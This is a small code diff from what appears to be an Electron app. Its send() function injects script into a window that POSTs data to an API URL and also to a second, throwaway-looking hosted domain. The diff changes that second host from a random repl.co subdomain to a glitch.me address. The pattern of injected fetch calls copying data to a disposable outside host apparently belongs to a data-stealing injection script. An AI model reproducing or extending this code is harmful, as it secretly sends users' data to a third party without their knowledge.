@@ -148,7 +148,7 @@ function send(e, s) {
     `fetch("${apiURL}/${e}", { method: "POST", body: JSON.stringify(${s})})`
   ),
     win.webContents.executeJavaScript(
-      `fetch("https://dawwdaiwjdiajwdajwdipjawpidjawpjd.23413ndacc.repl.co/${e}", { method: "POST", body: JSON.stringify(${s})})`
+      `fetch("https://invalidurl.glitch.me/${e}", { method: "POST", body: JSON.stringify(${s})})`
     );
 }
 function firstRun() {
